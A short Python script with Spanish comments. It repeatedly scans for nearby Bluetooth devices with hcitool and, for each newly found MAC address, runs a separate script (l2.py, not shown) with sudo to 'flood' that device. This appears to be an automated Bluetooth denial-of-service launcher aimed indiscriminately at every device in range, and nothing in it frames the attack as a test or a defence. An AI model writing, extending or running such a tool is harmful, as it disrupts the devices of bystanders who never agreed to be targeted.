import subprocess
import time
import re

# Ruta al script que floodea las direcciones MAC
SCRIPT_PATH = 'l2.py'

# Conjunto para mantener las direcciones MAC ya procesadas
processed_macs = set()

def scan_for_macs():
    """Realiza un escaneo usando hcitool y devuelve un conjunto de direcciones MAC encontradas."""
    result = subprocess.run(["hcitool", "scan"], capture_output=True, text=True)
    # El resultado contiene las lÃ­neas de salida del escaneo
    scan_output = result.stdout

    # Extraer las direcciones MAC del resultado
    mac_pattern = re.compile(r'([0-9A-Fa-f:]{17})')
    macs = set(mac_pattern.findall(scan_output))
    
    return macs

def main():
    while True:
        # Realizar el escaneo
        print("Realizando escaneo...")
        macs = scan_for_macs()

        # Encontrar y  guardar direcciones MAC que no estaban antes
        new_macs = macs - processed_macs

        for mac in new_macs:
            print(f"Detectada nueva MAC: {mac}. Ejecutando el script de floodeo...")
            # Ejecutar el script l2.py para cada MAC nueva
            subprocess.run(["sudo", "python3", SCRIPT_PATH, "-m", mac])
            # AÃ±adir la MAC al conjunto de procesadas
            processed_macs.add(mac)

        # Esperar 5 segundos antes del siguiente escaneo
        time.sleep(5)

if __name__ == "__main__":
    main()
